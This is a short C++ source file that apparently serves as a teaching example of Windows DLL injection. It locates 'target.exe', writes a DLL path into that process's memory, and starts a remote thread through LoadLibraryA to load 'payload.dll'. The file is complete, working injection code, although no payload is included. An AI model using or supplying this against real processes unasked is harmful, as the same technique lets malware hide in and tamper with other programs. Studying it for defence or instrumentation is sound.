/*
Example of simple dll injection technique using
create remote thread to execute loadlibrary in remote targets
address space.

Usage: run .\inject.exe from same directory as payload.dll.
*/

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <string>
#include <TlHelp32.h>
#include <algorithm>

/*==============================================================
                       Function Prototypes
================================================================*/

void InjectDLL(HANDLE targetHandle, LPCSTR DLLPath);
int GetPIDFromName(std::string name);

/*==============================================================
                       Main Function
================================================================*/

/*
Inject dll into target process.
1) allocate RW memory in target process.
2) write string containing path to dll in just allocated memory (strPtr).
3) Create a remote thread in target process using LoadLibrary as start routine
    and strPtr as thread argument.
*/

int main(int argc, char** argv)
{
    DWORD pid = GetPIDFromName("target.exe");
    HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);

    TCHAR dllPath[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, dllPath);
    strcat(dllPath,"\\payload.dll");
    printf("%s\n",dllPath);

    InjectDLL(targetHandle, dllPath);
    return 0;
}

/*==============================================================
                       Function Declarations
================================================================*/

void InjectDLL(HANDLE targetHandle, LPCSTR DLLPath)
{
    PVOID strPtr = VirtualAllocEx(targetHandle, NULL, lstrlen(DLLPath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(strPtr == NULL)
    {
        printf("\nError: VirtualAllocEx failed to allocate memory in target process\n"
        "Do you have the correct Access Rights?\n\n");
        exit(1);
    }

    WriteProcessMemory(targetHandle, strPtr, DLLPath, lstrlen(DLLPath), NULL);
    printf("Address of Injected Code: %08x\n", strPtr);
    HMODULE khandle = GetModuleHandle("kernel32.dll");
    LPVOID lpStartAddr = GetProcAddress(khandle, "LoadLibraryA");

    CreateRemoteThread(targetHandle, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddr, strPtr, 0, NULL);
}

int GetPIDFromName(std::string name)
{
    PROCESSENTRY32 process;
    process.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if(Process32First(hSnapshot, (PROCESSENTRY32*)&process))
    {
        while(Process32Next(hSnapshot, (PROCESSENTRY32*)&process))
        {
            if(stricmp(process.szExeFile, name.c_str())==0)
            {
                CloseHandle(hSnapshot);
                return process.th32ProcessID;
            }
        } 
    }

    CloseHandle(hSnapshot);
    return 0;
    
}